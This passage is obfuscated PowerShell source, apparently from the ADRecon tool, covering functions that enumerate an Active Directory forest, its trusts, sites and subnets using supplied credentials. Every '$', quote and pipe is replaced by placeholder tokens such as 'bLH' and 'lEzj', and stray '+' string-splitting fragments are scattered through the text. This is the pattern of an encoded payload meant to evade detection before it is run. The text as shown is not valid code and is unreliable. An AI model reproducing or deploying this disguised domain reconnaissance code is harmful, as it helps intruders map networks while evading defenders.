                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjDisabledlEzj
                bLHForestObj += bLHObj
            }
            Remove-Variable ADForest
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHDomainFQDN = Get-DNtoFQDN(bLHobjDomain.distinguishedName)
            bLHDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjDomainlEzj,bLH(bLHDomainFQDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
            Try
            {
                bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(bLHDomainContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRForest] Error getting Domain ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            Remove-Variable DomainContext

            bLHForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjForestlEzj,bLH(bLHADDomain.Forest),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
            Remove-Variable'+' ADDomain
            Try
            {
                bLHADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(bLHForestContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRForest] Error getting Forest ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
         '+'       Return bLHnull
            }
            Remove-Variable ForestContext

            # Get Tombstone Lifetime
            Try
            {
                bLHSearchPath = lEzjCN=Directory Service,CN=Windows NT,CN=ServiceslEzj
                bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLHSearchPath,bLH(bLHobjDomainRootDSE.configurationNamingContext)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
                bLHobjSearcherPath.Filter=lEzj(name=Directory Service)lEzj
                bLHobjSearcherResult = bLHobjSearcherPath.FindAll()
                bLHADForestTombstoneLifetime = bLHobjSearcherResult.Properties.tombstoneLifetime
                Remove-Variable SearchPath
                bLHobjSearchPath.Dispose()
                bLHobjSearcherPath.Dispose()
                bLHobjSearcherResult.Dispose()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRForest] Error retrieving Tombstone LifetimelEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32(bLHobjDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                Try
                {
                    bLHSearchPath = lEzjCN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=ConfigurationlEzj
                    bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLHSearchPath),bLH(bLHobjDomain.distinguishedName)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                    bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
                    bLHADRecycleBin = bLHobjSearcherPath.FindAll()
                    Remove-Variable SearchPath
                    bLHobjSear'+'chPath.Disp'+'ose()
                    bLHobjSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRForest] Error retrieving Recycle Bin FeaturelEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                }
            }
            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32(bLHobjDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                Try
                {
                    bLHSearchPath = lEzjCN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=ConfigurationlEzj
                    bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLHSearchPath),bLH(bLHobjDomain.distinguishedName)lEzj, bLHCredential.UserName,bLHCredential.'+'GetNetworkCredential().Password
                    bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
                    bLHPrivilegedAccessManagement = bLHobjSearcherPath.FindAll()
                    Remove-Variab'+'le SearchPath
                    bLHobjSearchPath.Dispose()
                    bLHobjSearcherPath.Dispose()
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRForest] Error retrieving Privileged Access Management FeaturelEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                }
            }
        }
        Else
        {
            bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            bLHADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

            # Get Tombstone Lifetime
            bLHADForestTombstoneLifetime = ([ADSI]lEzjLDAP://CN=Directory Service,CN=Windows NT,CN=Services,bLH(bLHobjDomainRootDSE.configurationNamingContext)lEzj).tombstoneLifetime.value

'+'            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32(bLHobjDomainRootDSE.forestFunctionality,10) -ge 6)
            {
                bLHADRecycleBin = ([ADSI]lEzjLDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,bLH(bLHobjDomain.distinguishedName)lEzj)
            }
            # Check Privileged Access Management Feature Status
            If ([convert]::ToInt32(bLHobjDomainRootDSE.forestFunctionality,10) -ge 7)
            {
                bLHPrivilegedAccessManagement = ([ADSI]lEzjLDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,bLH(bLHobjDomain.distinguishedName)lEzj)
            }
        }

        If (bLHADForest)
        {
            bLHForestObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            bLHFLAD = @{
	            0 = lEzjWindows2000lEzj;
	            1 = lEzjWindows2003/InterimlEzj;
	            2 = lEzjWindows2003lEzj;
	            3 = lEzjWindows2008lEzj;
	            4 = lEzjWindows2008R2lEzj;
	            5 = lEzjWindows2012lEzj;
	            6 = lEzjWindows2012R2lEzj;
                7 = lEzjWindows2016lEzj
            }
            bLHForestMode = bLHFLAD[[convert]::ToInt32(bLHobjDomainRootDSE.forestFunctionality,10)] + lEzjForestlEzj
            Remove-Variable FLAD

            bLHObjValues = @(lEzjNamelEzj, bLHADForest.Name, lEzjFunctional LevellEzj, bLHForestMode, lEzjDomain Naming MasterlEzj, bLHADForest.NamingRoleOwner, lEzjSche'+'ma MasterlEzj, bLHADForest.SchemaRoleOwner, lEzjRootDomainlEzj, bLHADForest.RootDomain, lEzjDomain CountlEzj, bLHADForest.Domains.Count, lEzjSite CountlEzj, bLHADForest.Sites.Count, lEzjGlobal Catalog CountlEzj, bLHADForest.GlobalCatalogs.Count)

            For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value bLHObjValues[bLHi]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHObjValues[bLHi+1]
                bLHi++
                bLHForestObj += bLHObj
            }
            Remove-Variable ForestMode

            For(bLHi=0; bLHi -lt bLHADForest.Domains.Count; bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjDomainlEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADForest.Domains[bLHi]
                bLHForestObj += bLHObj
            }
            For(bLHi=0; bLHi -lt bLHADForest.Sites.Count; bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjSitelEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj'+' -Value bLHADForest.Sites[bLHi]
                bLHForestObj += bLHObj
            }
            For(bLHi=0; bLHi -lt bLHADForest.GlobalCatalogs.Count; bLHi++)
            {
                bLHO'+'bj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjGlobalCataloglEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADForest.GlobalCatalogs[bLHi]
                bLHForestObj += bLHObj
            }

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjTombstone LifetimelEzj
            If (bLHADForestTombstoneLifetime)
            {
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjNot RetrievedlEzj
            }
            bLHForestObj += bLHObj

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjRecycle Bin (2008 R2 onwards)lEzj
            If (bLHADRecycleBin)
            {
                If (bLHADRecycleBin.Properties.xfJ4msDS-EnabledFeatureBLxfJ4.Count -gt 0)
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjEnabledlEzj
                    bLHForestObj += bLHObj
                    For(bLHi=0; bLHi -lt bLH(bLHADRecycleBin.Properties.xfJ4msDS-EnabledFeatureBLxfJ4.Count); bLHi++)
                    {
                        bLHObj = New-Object PSObject
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjEnabled ScopelEzj
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty '+'-Name lEzjValuelEzj -Value bLHADRecycleBin.Properties.xfJ4msDS-Ena'+'bledFeatureBLxfJ4[bLHi]
                        bLHForestObj += bLHObj
                    }
                }
 '+'               Else
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjDisabledlEzj
                    bLHForestObj += bLHObj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjDisabledlEzj
                bLHForestObj += bLHObj
            }

            bLHObj = New-Object PSObject
  '+'          bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjPrivileged Access Management (2016 onwards)lEzj
            If (bLHPrivilegedAccessManagement)
            {
                If (bLHPrivilegedAccessManagement.Properties.xfJ4msDS-EnabledFeatureBLxfJ4.Count -gt 0)
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjEnabledlEzj
                    bLHForestObj += bLHObj
                    For(bLHi=0; bLHi -lt bLH(bLHPrivilegedAccessManagement.Properties.xfJ4msDS-EnabledFeatureBLxfJ4.Count); bLHi++)
                    {
                        bLHObj = New-Object PSObject
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjEnabled ScopelEzj
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHPrivilegedAccessManagement.Properties.xfJ4msDS-EnabledFeatureBLxfJ4[bLHi]
                        bLHForestObj += bLHObj
                    }
                }
                Else
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjDisabledlEzj
                    bLHForestObj += bLHObj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjDisabledlEzj
                bLHForestObj += bLHObj
            }

            Remove-Varia'+'ble ADForest
        }
    }

    If (bLHForestObj)
    {
        Return bLHForestObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRTrust
{
<#
.SYNOPSIS
    Returns the Trusts of the current (or specified) domain.

.DESCRIPTION'+'
    Returns the Trusts of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain
    )

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223768.aspx
    bLHTDAD = @{
        0 = lEzjDisabledlEzj;
        1 = lEzjInboundlEzj;
        2 = lEzjOutboundlEzj;
        3 = lEzjBiDirectionallEzj;
    }

    # Values taken from https://msdn.microsoft.com/en-us/library/cc223771.aspx
    bLHTTAD = @{
        1 = lEzjDownlevellEzj;
        2 = lEzjUplevellEzj;
        3 = lEzjMITlEzj;
        4 = lEzjDCElEzj;
    }

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADTrusts = Get-ADObject -LDAPFilter lEzj(objectClass=trustedDomain)lEzj -Properties DistinguishedName,trustPartner,trustdirection,trusttype,TrustAttributes,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRTrust] Error while enumerating trustedDomain ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] '+'bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADTrusts)
        {
            Write-Verbose lEz'+'j[*] Total Trusts: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADTrusts))lEzj
            # Trust Info
            bLHADTrustObj = @()
            bLHADTrusts 0Ogv ForEach-Object {
                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjSource DomainlEzj -Value (Get-DNtoFQDN bLH_.DistinguishedName)
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTarget DomainlEzj -Value bLH_.trustPartner
                bLHTrustDirection = [string] bLHTDAD[bLH_.trustdirection]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTrust DirectionlEzj -Value bLHTrustDirection
                bLHTrustType = [string] bLHTTAD[bLH_.trusttype]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTrust TypelEzj -Value bLHTrustType

                bLHTrustAttributes = bLHnull
                If ([int32] bLH_.TrustAttributes -band 0x00000001) { bLHTrustAttributes += lEzjNon Transitive,lEzj }
                If ([int32] bLH_.TrustAttributes -band 0x00000002) { bLHTrustAttributes += lEzjUpLevel,lEzj }
                If ([int32] bLH_.TrustAttributes -band 0x00000004) { bLHTrustAttributes += lEzjQuarantined,lEzj } #SID Filtering
                If ([int32] bLH_.TrustAttributes -band 0x00000008) { bLHTrustAttributes += lEzjForest Transitive,lEzj }
                If ([int32] bLH_.TrustAttributes -band 0x00000010) { bLHTrustAttributes += lEzjCross Organization,lEzj } #Selective Auth
                If ([int32] bLH_.TrustAttributes -band 0x00000020) { bLHTrustAttributes += lEzjWithin Forest,lEzj }
                If ([int32] bLH_.TrustAttributes -band 0x00000040) { bLHTrustAttributes += lEzjTreat as External,lEzj }
                If ([int32] bLH_.TrustAttributes -band 0x00000080) { bLHTrustAttributes += lEzjUses RC4 Encryption,lEzj }
                If ([int32] bLH_.TrustAttributes -band 0x00000200) { bLHTrustAttributes += lEzjNo TGT Delegation,lEzj }
                If ([int32] bLH_.TrustAttribute'+'s -band 0x00000400) { bLHTrustAttributes += lEzjPIM Trust,lEzj }
                If (bLHTrustAttributes)
                {
                    bLHTrustAttributes = bLHTrustAttributes.TrimEnd(lEzj,lEzj)
                }
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjAttributeslEzj -Value bLHTrustAttributes
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenCreated'+'lEzj -Value ([DateTime] bLH(bLH_.whenCreated))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenChangedlEzj -Value ([DateTime] bLH(bLH_.whenChanged))
                bLHADTrustObj += bLHObj
            }
            Remove-Variable ADTrusts
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectClass=trustedDomain)lEzj
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjtrustpartnerlEzj,lEzjtrustdirectionlEzj,lEzjtrusttypelEzj,lEzjtrustattributeslEzj,lEzjwhencreatedlEzj,lEzjwhenchangedlEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADTrusts = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRTrust] Error while enumerating trustedDomain ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADTrusts)
        {
            Write-Verbose lEzj[*] Total Trusts: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADTrusts))lEzj
            # Trust Info
            bLHADTrustObj = @()
            bLHADTrusts 0Ogv ForEach-Object {
                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjSource DomainlEzj -Value bLH(Get-DNtoFQDN ([string] bLH_.Properties.distinguishedname))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTarget DomainlEzj -Value bLH([string] bLH_.Properties.trustpartner)
                bLHTrustDirection = [string] bLHTDAD[bLH_.Properties.trustdirection]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTrust DirectionlEzj -Value bLHTrustDirection
                bLHTrustType = [string] bLHTTAD[bLH_.Properties.trusttype]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjTrust TypelEzj -Value bLHTrustType

                bLHTrustAttributes = bLHnull
                If ([int32] bLH_.Properties.trustattributes[0] -band 0x00000001) { bLHTrustAttributes += lEzjNon Transitive,lEzj }
                If ([int32] bLH_.Properties.trustattributes[0] -band 0x00000002) { bLHTrustAttributes += lEzjUpLevel,lEzj }
                If ([int32] bLH'+'_.Properties.trustattributes[0] -band 0x00000004) { bLHTrustAttributes += lEzjQuarantined,lEzj } #SID Filtering
        '+'        If ([int32] bLH_.Properties.trustattributes[0] -band 0x00000008) { bLHTrustAttributes += lEzjForest Transitive,lEzj }
                If ([int32] bLH_.Properties.trustattributes[0] -band 0x000'+'00010) { bLHTrustAttributes += lEzjCross Organization,lEzj } #Selective Auth
                If ([int32] bLH_.P'+'roperties.trustattributes[0] -band 0x00000020) { bLHTrustAttributes += lEzjWithin Forest,lEzj }
                If ([int32] bLH_.Properties.trustattributes[0] -band 0x00000040) { bLHTrustAttributes += lEzjTreat as External,lEzj }
                If ([int32] bLH_.Properties.trustattributes[0] -band 0x00000080) { bLHTrustAttributes += lEzjUses RC4 Encryption,lEzj }
                If ([int32] bLH_.Properties.trustattributes[0] -band 0x00000200) { bLHTrustAttributes += lEzjNo TGT Delegation,lEzj }
                If ([int32] bLH_.Properties.trustattributes[0] -band 0x00000400) { bLHTrustAttributes += lEzjPIM Trust,lEzj }
                If (bLHTrustAttributes)
                {
                    bLHTrustAttributes = bLHTrustAttributes.TrimEnd(lEzj,lEzj)
                }
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjAttributeslEzj -Value bLHTrustAttributes
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenCreatedlEzj -Value ([DateTime] bLH(bLH_.Properties.whencreated))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenChangedlEzj -Value ([DateTime] bLH(bLH_.Properties.whenchanged))
                bLHADTrustObj += bLHObj
            }
            Remove-Variable ADTrusts
        }
    }

    If (bLHADTrustObj)
    {
        Return bLHADTrustObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRSite
{
<#
.SYNOPSIS
    Returns the Sites of the current (or specified) domain.

.DESCRIPTION
    Returns the Sites of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomainRootDSE,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHSearchPath = lEzjCN=SiteslEzj
            bLHADSites = Get-ADObject -SearchBase lEzjbLHSearchPath,bLH((Get-ADRootDSE).configurationNamingContext)lEzj -LDAPFilter lEzj(objectClass=site)lEzj -Properties Name,Description,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRSite] Error while enumerating Site ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADSites)
        {
            Write-Verbose lEzj[*] Total Sites: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADSites))lEzj
            # Sites Info
            bLHADSiteObj = @()
            bLHADSites 0Ogv ForEach-Object {
                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjNamelEzj -Value bLH_.Name
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjDescriptionlEzj -Value bLH_.Description
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -N'+'ame lEzjwhenCreatedlEzj -Value bLH_.whenCreated
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenChangedlEzj -Value bLH_.whenChanged
                bLHADSiteObj += bLHObj
            }
            Remove-Variable ADSites
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHSearchPath = lEzjCN=SiteslEzj
        If'+' (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLHSearchPath,bLH(bLHobjDomainRootDSE.ConfigurationNamingContext)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
        }
      '+'  Else
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLHSearchPath,bLH(bLHobjDomainRootDSE.ConfigurationNamingContext)lEzj
        }
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
        bLHObjSearcher.Filter = lEzj(objectClass=site)lEzj
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADSites = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRSite] Error while enumerating Site ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADSites)
        {
            Write-Verbose lEzj[*] Total Sites: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADSites))lEzj
            # Site Info
            bLHADSiteObj = @()
            bLHADSites 0Ogv ForEach-Object {
                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjNamelEzj -Value bLH([string] bLH_.Properties.name)
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjDescriptionlEzj -Value bLH([string] bLH_.Properties.description)
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenCreatedlEzj -Value ([DateTime] bLH(bLH_.Properties.whencreated))
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenChangedlEzj -Value ([DateTime] bLH(bLH_.Properties.whenchanged))
                bLHADSiteObj += bLHObj
            }
            Remove-Variable ADSites
        }
    }

    If (bLHADSiteObj)
    {
        Return bLHADSiteObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRSubnet
{
<#
.SYNOPSIS
    Returns the Subnets of the current (or specified) domain.

.DESCRIPTION
    Returns the Subnets of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomainRootDSE,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHSearchPath = lEzjCN=Subnets,CN=SiteslEzj
            bLHADSubnets = Get-ADObject -SearchBase lEzjbLHSearchPath,bLH((Get-ADRootDSE).configurationNamingContext)lEzj -LDAPFilter lEzj(objectClass=subnet)lEzj -Properties Name,Description,siteObject,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRSubnet] Error while enumerating Subnet ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        If (bLHADSubnets)
        {
            Write-Verbose lEzj[*] Total Subnets: bLH([ADRecon.ADWSClass]::ObjectCount(bLHADSubnets))lEzj
            # Subnets Info
      '+'      bLHADSubnetObj = @()
            bLHADSubnets 0Ogv ForEach-Object {
                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjSitelEzj -Value bLH((bLH_.siteObject -Split lEzj,lEzj)[0] -replace xfJ4CN=xfJ4,xfJ4xfJ4)
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjNamelEzj -Value bLH_.Name
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjDescriptionlEzj -Value bLH_.Description
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenCreatedlEzj -Value bLH_.whenCreated
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenChangedlEzj -Value bLH_.whenChanged
                bLHADSubnetObj += bLHObj
            }
            Remove-Variable ADSubnets
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHSearchPath = lEzjCN=Subnets,CN=SiteslEzj
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLHSearchPath,bLH(bLHobjDomainRootDSE.ConfigurationNamingContext)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
        }
        Else
        {
            bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLHSearchPath,bLH(bLHobjDomainRootDSE.ConfigurationNamingContext)lEzj
        }
        bLHobjSearcher ='+' New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
        bLHObjSearcher.Filter = lEzj(objectClass=subnet)lEzj
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHADSubnets = bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRSubnet] Error while enumerating Subnet ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        bLHObjSearcher.dispose()

        If (bLHADSubnets)
        {
            Write-Verbose lEzj[*] Total Subnets: bLH([ADRecon.LDAPClass]::ObjectCount(bLHADSubnets))lEzj
            # Subnets Info
            bLHADSubnetObj = @()
            bLHADSubnets 0Ogv ForEach-Object {
                # Create the object for each instance.
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjSitelEzj -Value bLH((([string] bLH_.Properties.siteobject) -Split lEzj,lEzj)[0] -replace xfJ4CN=xfJ4,xfJ4xfJ4)
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjNamelEzj -Value bLH([string] bLH_.Properties.name)
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjDescriptionlEzj -Value bLH([string] bLH_.Properties.description)
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjwhenCreatedlEzj -Value ([DateTime] bLH(bLH_.Properties.whencreated))
